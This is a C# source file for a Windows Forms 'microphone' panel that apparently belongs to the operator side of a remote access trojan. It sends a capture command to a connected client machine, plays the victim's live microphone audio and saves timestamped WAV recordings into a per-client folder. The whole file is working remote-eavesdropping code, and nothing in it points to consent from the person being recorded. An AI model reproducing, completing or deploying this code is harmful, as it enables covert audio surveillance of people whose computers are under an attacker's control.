using NAudio.Wave;
using Server.Connection;
using Server.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormMicrophone : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }

        private BufferedWaveProvider _bufferedWaveProvider;
        private WaveOutEvent _waveOut;
        private WaveFileWriter _waveFileWriter;
        private readonly WaveFormat _waveFormat = new WaveFormat(16000, 16, 1);
        private bool _isSaving;
        private string _savePath;
        private readonly object _audioLock = new object();

        public FormMicrophone()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Receives a raw PCM audio chunk from the client and plays/saves it.
        /// </summary>
        public void AppendAudioData(byte[] data)
        {
            if (data == null || data.Length == 0) return;

            lock (_audioLock)
            {
                try
                {
                    _bufferedWaveProvider?.AddSamples(data, 0, data.Length);

                    if (_isSaving && _waveFileWriter != null)
                    {
                        _waveFileWriter.Write(data, 0, data.Length);
                        _waveFileWriter.Flush();
                    }
                }
                catch { }
            }
        }

        private void StartPlayback()
        {
            lock (_audioLock)
            {
                try
                {
                    _bufferedWaveProvider = new BufferedWaveProvider(_waveFormat)
                    {
                        BufferDuration = TimeSpan.FromSeconds(5),
                        DiscardOnBufferOverflow = true
                    };
                    _waveOut = new WaveOutEvent();
                    _waveOut.Init(_bufferedWaveProvider);
                    _waveOut.Play();
                }
                catch { }
            }
        }

        private void StopPlayback()
        {
            lock (_audioLock)
            {
                try
                {
                    _waveOut?.Stop();
                    _waveOut?.Dispose();
                    _waveOut = null;
                    _bufferedWaveProvider = null;
                }
                catch { }
            }
        }

        private void BtnRecord_Click(object sender, EventArgs e)
        {
            try
            {
                if (btnRecord.Tag as string == "start")
                {
                    StartPlayback();

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "microphone";
                    msgpack.ForcePathObject("Command").AsString = "capture";
                    msgpack.ForcePathObject("DeviceIndex").AsInteger = comboBox1.SelectedIndex;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());

                    btnRecord.Tag = "stop";
                    btnRecord.Text = "Stop";
                    comboBox1.Enabled = false;
                    btnSave.Enabled = true;
                    labelStatus.Text = "Recording...";
                }
                else
                {
                    StopRecordingAndPlayback();
                }
            }
            catch { }
        }

        private void StopRecordingAndPlayback()
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Command").AsString = "stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());

                StopPlayback();

                lock (_audioLock)
                {
                    _waveFileWriter?.Dispose();
                    _waveFileWriter = null;
                    _isSaving = false;
                }

                btnRecord.Tag = "start";
                btnRecord.Text = "Record";
                comboBox1.Enabled = true;
                btnSave.Text = "Save";
                btnSave.Enabled = false;
                labelStatus.Text = "Stopped";
            }
            catch { }
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            lock (_audioLock)
            {
                try
                {
                    if (_isSaving)
                    {
                        // stop saving
                        _waveFileWriter?.Dispose();
                        _waveFileWriter = null;
                        _isSaving = false;
                        btnSave.Text = "Save";
                        labelStatus.Text = "Recording (not saving)";

                        if (File.Exists(_savePath))
                        {
                            try { Process.Start(_savePath); }
                            catch { }
                        }
                    }
                    else
                    {
                        // start saving
                        _savePath = Path.Combine(
                            System.Windows.Forms.Application.StartupPath,
                            "ClientsFolder",
                            Client?.ID ?? "unknown",
                            "Microphone",
                            $"MIC_{DateTime.Now:MM-dd-yyyy_HH-mm-ss}.wav");

                        string dir = Path.GetDirectoryName(_savePath);
                        if (!Directory.Exists(dir))
                            Directory.CreateDirectory(dir);

                        _waveFileWriter = new WaveFileWriter(_savePath, _waveFormat);
                        _isSaving = true;
                        btnSave.Text = "Stop Save";
                        labelStatus.Text = "Recording & Saving...";
                    }
                }
                catch { }
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (ParentClient?.TcpClient?.Connected == false || Client?.TcpClient?.Connected == false)
                    this.Close();
            }
            catch { this.Close(); }
        }

        private void FormMicrophone_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try { StopPlayback(); } catch { }
                    lock (_audioLock)
                    {
                        try { _waveFileWriter?.Dispose(); _waveFileWriter = null; } catch { }
                    }
                    Client?.Disconnected();
                });
            }
            catch { }
        }
    }
}
